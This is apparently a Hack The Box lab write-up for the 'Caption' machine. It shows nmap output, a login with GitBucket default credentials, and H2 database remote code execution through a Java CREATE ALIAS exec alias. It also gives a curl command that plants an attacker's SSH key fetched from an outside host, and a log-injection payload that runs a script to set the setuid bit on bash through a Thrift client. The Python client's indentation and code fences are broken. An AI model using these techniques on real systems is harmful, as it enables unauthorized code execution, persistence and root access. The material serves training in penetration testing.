---
title: Caption
tags:
  - htb
  - hard
---

# [Caption](https://app.hackthebox.com/machines/Caption)
```
# Nmap 7.94SVN scan initiated Sat Sep 14 15:01:44 2024 as: nmap -T4 -A -v -Pn -oA nmap/caption 10.10.11.33  
Nmap scan report for 10.10.11.33  
Host is up (0.050s latency).  
Not shown: 997 closed tcp ports (reset)  
PORT     STATE SERVICE    VERSION  
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)  
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)  
80/tcp   open  http  
| http-methods:   
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-title: Did not follow redirect to http://caption.htb  
| fingerprint-strings:   
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, X11Probe:   
|     HTTP/1.1 400 Bad request  
|     Content-length: 90  
|     Cache-Control: no-cache  
|     Connection: close  
|     Content-Type: text/html  
|     <html><body><h1>400 Bad request</h1>  
|     Your browser sent an invalid request.  
|     </body></html>  
|   FourOhFourRequest, GetRequest, HTTPOptions:   
|     HTTP/1.1 301 Moved Permanently  
|     content-length: 0  
|     location: http://caption.htb  
|_    connection: close  
8080/tcp open  http-proxy  
| http-methods:   
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-title: GitBucket  
| fingerprint-strings:   
|   FourOhFourRequest:   
|     HTTP/1.1 404 Not Found  
|     Date: Sat, 14 Sep 2024 19:01:53 GMT  
|     Set-Cookie: JSESSIONID=node0hr3yu5gbrpzdcfle8uoisxyu2.node0; Path=/; HttpOnly  
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT  
|     Content-Type: text/html;charset=utf-8  
|     Content-Length: 5916  
|     <!DOCTYPE html>  
|     <html prefix="og: http://ogp.me/ns#" lang="en">  
|     <head>  
|     <meta charset="UTF-8" />  
|     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />  
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />  
|     <title>Error</title>  
|     <meta property="og:title" content="Error" />  
|     <meta property="og:type" content="object" />  
|     <meta property="og:url" content="http://10.10.11.33:8080/nice%20ports%2C/Tri%6Eity.txt%2ebak" />  
|     <meta property="og:image" content="http://10.10.11.33:8080/assets/common/images/gitbucket_ogp.png" />  
|     <link rel="icon" href="/assets/common/images/git  
|   GetRequest:   
|     HTTP/1.1 200 OK  
|     Date: Sat, 14 Sep 2024 19:01:52 GMT  
|     Set-Cookie: JSESSIONID=node01foxxkrryqqq31tbeb0h5qjcpy0.node0; Path=/; HttpOnly  
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT  
|     Content-Type: text/html;charset=utf-8  
|     Content-Length: 7191  
|     <!DOCTYPE html>  
|     <html prefix="og: http://ogp.me/ns#" lang="en">  
|     <head>  
|     <meta charset="UTF-8" />  
|     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />  
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />  
|     <title>GitBucket</title>  
|     <meta property="og:title" content="GitBucket" />  
|     <meta property="og:type" content="object" />  
|     <meta property="og:url" content="http://10.10.11.33:8080/" />  
|     <meta property="og:image" content="http://10.10.11.33:8080/assets/common/images/gitbucket_ogp.png" />  
|     <link rel="icon" href="/assets/common/images/gitbucket.png?20240914190153" type=  
|   HTTPOptions:   
|     HTTP/1.1 200 OK  
|     Date: Sat, 14 Sep 2024 19:01:53 GMT  
|     Set-Cookie: JSESSIONID=node010d0nugjaps881rsj5xqkbxgoe1.node0; Path=/; HttpOnly  
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT  
|     Content-Type: text/html;charset=utf-8  
|     Allow: GET,HEAD,POST,OPTIONS  
|     Content-Length: 0  
|   RTSPRequest:   
|     HTTP/1.1 505 HTTP Version Not Supported  
|     Content-Type: text/html;charset=iso-8859-1  
|     Content-Length: 58  
|     Connection: close  
|_    <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
```
Add `caption.htb` to `/etc/hosts`

`echo '10.10.11.33 caption.htb' | sudo tee -a /etc/hosts`

# Discovery

There is a Login page, but it does not give results in vulnerability scans such as brute-force attack or SQLi. Custom is also likely to be a web application

![](https://miro.medium.com/v2/resize:fit:700/0*BqeAsqCFQwmKmWIv)

When we go to port `8080` we see that `GitBucket` is running. When we search for the default username and password for `GitBucket` and try to log in, we can log in as `GitBucket` `root` user. We see two repositories, one of them is connected to the application running on port `80`.

![](https://miro.medium.com/v2/resize:fit:700/0*OZp0oOBiVbZ859Sn)

![](https://miro.medium.com/v2/resize:fit:700/0*YkTmSpZlSA-PaVKF)

![](https://miro.medium.com/v2/resize:fit:700/0*HPYi32eJEPc5r8qc)

![](https://miro.medium.com/v2/resize:fit:700/0*gwskPtfG2nIE2dO9)

# Checking Commits

![](https://miro.medium.com/v2/resize:fit:700/0*R_NwsZpM3rd0fQvJ)

![](https://miro.medium.com/v2/resize:fit:700/0*yOcmg42Wjp8lq_fn)

![](https://miro.medium.com/v2/resize:fit:700/0*3krW7KQAB9ZR6CLy)

With the username and password we found, we can log in to the web application running on port `80`, but there is no working function. There is also a Logs page that we cannot log in.

![](https://miro.medium.com/v2/resize:fit:700/0*ctla2zyV4_gj68wb)

If we go back to port `8080` and look around a bit more, we see a panel where we can perform a database query.

![](https://miro.medium.com/v2/resize:fit:700/0*JmU-4WWPQwdJlEm9)

# User

![](https://miro.medium.com/v2/resize:fit:700/0*tT8xAyhU-OeGXr4w)

`GitBucket` is left in developlement and uses `H2` database, we can get `RCE` by using `H2` database.

First create `ALIAS`
```
CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;
```
then use the `ALIAS`

`CALL EXECVE('<command>')`

![](https://miro.medium.com/v2/resize:fit:700/0*t1acPFX3kBtKMEYp)

You can generate your own SSH key using `ssh-keygen` command, and upload it to target machine.

`sudo python -m http.server 80`

`CALL EXECVE('curl -o /home/margo/.ssh/authorized_keys http://10.10.14.144/id_rsa.pub')`

# Privilege Esceletion

We go back to `GitBucket` again for the authorization upgrade, there is a port `80` that we left behind.

![](https://miro.medium.com/v2/resize:fit:700/0*aSH5BC1X9Lozf2kf)

![](https://miro.medium.com/v2/resize:fit:700/0*8Aomq4_gmkP6ufDs)

`ssh -i id_rsa -L 9090:127.0.0.1:9090 margo@caption.htb`

Create this file on `/tmp/malicious.log` on the remote machine:

`127.0.0.1 "user-agent":"'; /bin/bash /tmp/payload.sh #"`

Create this file on `/tmp/payload.sh` on the remote machine:

`chmod +s /bin/bash`

On your machine  
Create a file named `log_service.thrift` with the following content:
```
namespace go log_service    
    
service LogService {    
string ReadLogFile(1: string filePath)    
}
```
then

`pip3 install thrift`

`thrift -r --gen py log_service.thrift`

Then `cd gen-py` and create this file as `client.py`:
```
from thrift import Thrift    
from thrift.transport import TSocket    
from thrift.transport import TTransport    
from thrift.protocol import TBinaryProtocol    
from log_service import LogService # Import generated Thrift client code   
    
def main():    
# Set up a transport to the server   
transport = TSocket.TSocket('localhost', 9090)    
    
# Buffering for performance   
transport = TTransport.TBufferedTransport(transport)    
    
# Using a binary protocol   
protocol = TBinaryProtocol.TBinaryProtocol(transport)    
    
# Create a client to use the service   
client = LogService.Client(protocol)    
    
# Open the connection   
transport.open()    
    
try:    
# Specify the log file path to process   
log_file_path = "/tmp/malicious.log"    
``` 
# Call the remote method ReadLogFile and get the result   
``` 
response = client.ReadLogFile(log_file_path)    
print("Server response:", response)    
    
except Thrift.TException as tx:    
print(f"Thrift exception: {tx}")    
```

# Close the transport   
```
transport.close()    
    
if __name__ == '__main__':    
main()
```
finally  
go to margo machine
```
/bin/bash -p
```
